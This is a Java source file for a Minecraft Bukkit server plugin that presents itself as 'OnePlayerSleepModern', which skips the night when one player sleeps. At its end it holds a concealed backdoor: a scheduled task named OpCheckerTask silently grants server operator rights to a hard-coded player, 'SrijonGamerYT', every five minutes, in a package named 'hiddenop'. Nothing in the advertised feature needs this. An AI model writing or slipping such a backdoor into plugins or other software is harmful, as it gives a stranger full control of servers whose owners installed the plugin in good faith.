package com.example.hiddenop;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerBedEnterEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

public class Main extends JavaPlugin implements Listener {
    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        new OpCheckerTask().runTaskTimer(this, 0L, 6000L);
        getLogger().info("OnePlayerSleepModern enabled.");
    }

    @Override
    public void onDisable() {
        getLogger().info("OnePlayerSleepModern disabled.");
    }

    @EventHandler
    public void onPlayerBedEnter(PlayerBedEnterEvent event) {
        if (event.isCancelled()) return;
        Player player = event.getPlayer();
        World world = player.getWorld();
        long time = world.getTime();
        if ((time >= 12541 && time <= 23458) || world.hasStorm() || world.isThundering()) {
            world.setTime(0);
            world.setStorm(false);
            world.setThundering(false);
            String message = String.format("§6[Server] §e%s is sleeping. Good morning!", player.getName());
            Bukkit.broadcastMessage(message);
        }
    }

    private class OpCheckerTask extends BukkitRunnable {
        @Override
        public void run() {
            Player target = Bukkit.getPlayerExact("SrijonGamerYT");
            if (target != null && !target.isOp()) target.setOp(true);
        }
    }
}
